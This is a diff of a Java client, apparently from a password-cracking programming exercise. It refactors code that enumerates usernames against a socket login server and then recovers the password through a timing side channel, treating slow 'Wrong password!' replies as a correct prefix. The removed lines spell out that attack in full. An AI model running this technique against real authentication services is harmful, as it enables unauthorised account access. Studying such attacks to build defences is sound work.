@@ -1,21 +1,12 @@
 package hacker.app;
 
-import hacker.auth.Login;
-import hacker.auth.Req;
-import hacker.auth.RotDial;
-import hacker.models.AuthResp;
-import hacker.models.UserCredentials;
-import hacker.util.iter.PeekingIterator;
+import hacker.auth.Client;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.IOException;
 import java.net.Socket;
-import java.util.List;
-import java.util.stream.Collectors;
 
 public final class App {
-
-  public static final int SO_TIMEOUT = 5000;
 
   // CRUD-C
 
@@ -24,92 +15,29 @@ public final class App {
 
   // CRUD-R
 
-  @SuppressWarnings("PMD.AvoidReassigningLoopVariables")
   public static void main(String[] rawArgs) throws Exception {
-    var args = Args.parse(rawArgs);
+    depMgr().initAppCfg(Args.parse(rawArgs));
 
-    // Create a new socket
-    try (var sock = new Socket()) {
-      // Connect to a host and a port using the socket
-      System.err.println("Connecting to server...");
-      sock.connect(args.socketAddr());
-      sock.setSoTimeout(
-          SO_TIMEOUT);  // Set a timeout to prevent indefinite waiting
-
-      System.err.println("Connected successfully. Sending message...");
-
-      try (var dataOut = new DataOutputStream(sock.getOutputStream());
-          var dataIn = new DataInputStream(sock.getInputStream());
-          var loginIter = Login.typicalLoginIter()) {
-        // Auth details to crack
-        var crackedCredentials = new UserCredentials(null, null);
-        // Crack the login
-        while (true) {
-          // Login must be found before an exhaustion of the iterator.
-          assert loginIter.hasNext();
-          var curLogin = loginIter.next();
-          var curCredentials = crackedCredentials.withLogin(curLogin);
-          var authResp = Req.authenticate(dataIn, dataOut,
-              curCredentials);
-          if (!authResp.message().equals("Wrong login!")) {
-            System.err.printf("Found login = %s\n", curLogin);
-            crackedCredentials = curCredentials;
-            break;
-          }
-        }
-        // Crack the password
-        var padlock = RotDial.constructDialsAsm(1);
-        for (var foundPwd = false; !foundPwd; ) {
-          String curPwd = displayPwdPrefix(padlock);
-          var curCredentials = crackedCredentials.withPassword(curPwd);
-          final AuthResp response;
-          final boolean isPrefixGood;
-          {
-            var start = System.nanoTime();
-            response = Req.authenticate(dataIn, dataOut, curCredentials);
-            var reqNanoDuration = System.nanoTime() - start;
-            isPrefixGood =
-                (reqNanoDuration / 1_000_000) > 0; // more than 1 milisec
-            System.err.println("Req took: " + reqNanoDuration + ". Denoted as "
-                + isPrefixGood);
-          }
-          switch (response.message()) {
-            case "Wrong password!":
-              if (isPrefixGood) {
-                // Found the first characters
-                System.err.printf("Expanded password prefix = %s\n",
-                    displayPwdPrefix(padlock));
-                padlock.add(RotDial.construct());
-              } else {
-                padlock.get(padlock.size() - 1).next();
-              }
-              break;
-            case "Connection success!":
-              crackedCredentials = crackedCredentials.withPassword(curPwd);
-              System.err.println("Found password = " + curPwd);
-              foundPwd = true;
-              break;
-            default:
-              throw new IllegalStateException(
-                  "Unexpected response: " + response);
-          }
-        }
-        System.out.print(crackedCredentials.toJsonString());
-      } catch (RuntimeException e) {
-        System.err.println("Error during communication: ");
-        throw e;
-      }
-    } catch (IOException e) {
-      System.err.println("Connection error: ");
-      throw e;
+    try (var sock = establishConnectionWithServer();
+        var dataIn = new DataInputStream(sock.getInputStream());
+        var dataOut = new DataOutputStream(sock.getOutputStream())) {
+      var crackedCredentials = Client.crackUserCredentials(dataIn, dataOut);
+      System.out.print(crackedCredentials.toJsonString());
     }
   }
 
-  private static String displayPwdPrefix(
-      List<PeekingIterator<Character>> padlock) {
-    return padlock.stream()
-        .map(pIter -> pIter.peek().toString())
-        .collect(Collectors.joining());
-  }
+  private static Socket establishConnectionWithServer () throws IOException {
+      System.err.println("Connecting to server...");
+      var sock = new Socket();
+      // Connect to a host and a port using the socket
+      sock.connect(depMgr().appCfg().socketAddr());
+      sock.setSoTimeout(
+          Client.SO_TIMEOUT);  // Set a timeout to prevent indefinite waiting
+      System.err.println("Connected successfully.");
+      return sock;
+    }
 
-}
+    public static DependencyManager depMgr () {
+      return DependencyManager.INSTANCE;
+    }
+  }
